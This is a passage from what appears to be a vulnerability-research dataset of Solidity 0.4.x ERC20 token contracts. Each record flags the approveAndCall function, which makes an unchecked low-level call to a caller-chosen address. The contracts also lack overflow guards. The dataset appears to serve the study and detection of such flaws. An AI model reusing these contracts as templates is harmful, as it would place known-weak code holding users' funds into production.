  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"DUBAI\";\n decimals = 18;\n symbol = \"DUBAI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1491"
  },
  "filename": "31876.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MomonioToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MomonioToken(\n ) {\n balances[msg.sender] = 6660000000000000;\n totalSupply = 6660000000000000;\n name = \"Momonio\";\n decimals = 8;\n symbol = \"MMN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1492"
  },
  "filename": "31888.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1493"
  },
  "filename": "31914.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitProCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitProCoin(\n ) {\n balances[msg.sender] = 1000000000000;\n totalSupply = 1000000000000;\n name = \"BitProCoin\";\n decimals = 4;\n symbol = \"BPC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1494"
  },
  "filename": "31944.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Travelerscash is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Travelerscash(\n ) {\n balances[msg.sender] = 200000000;\n totalSupply = 200000000;\n name = \"Travelerscash\";\n decimals = 18;\n symbol = \"TCASH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1495"
  },
  "filename": "31956.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Millenium is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Millenium(\n ) {\n balances[msg.sender] = 50000000;\n totalSupply = 50000000;\n name = \"Milleniuim\";\n decimals = 0;\n symbol = \"MLL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1496"
  },
  "filename": "31981.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 25000000;\n totalSupply = 25000000;\n name = \"BART\";\n decimals = 2;\n symbol = \"BART\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1497"
  },
  "filename": "32017.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 150000000;\n totalSupply = 150000000;\n name = \"EMDR-TOKEN\";\n decimals = 4;\n symbol = \"EMDR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1498"
  },
  "filename": "32023.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumDeluxe is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EthereumDeluxe() {\n totalSupply = 7000000000000000000000000;\n balances[msg.sender] = totalSupply;\n name = \"Ethereum Deluxe\";\n decimals = 18;\n symbol = \"ETHDX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1499"
  },
  "filename": "32042.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LawNet is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function LawNet(\n ) {\n balances[msg.sender] = 9000000000000000;\n totalSupply = 9000000000000000;\n name = \"LawNet\";\n decimals = 8;\n symbol = \"LNT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb149a"
  },
  "filename": "32049.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract GUESS is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function GUESS(\n ) {\n balances[msg.sender] = 20000000000;\n totalSupply = 20000000000;\n name = \"GUESS\";\n decimals = 2;\n symbol = \"GUESS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb149b"
  },
  "filename": "32051.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns 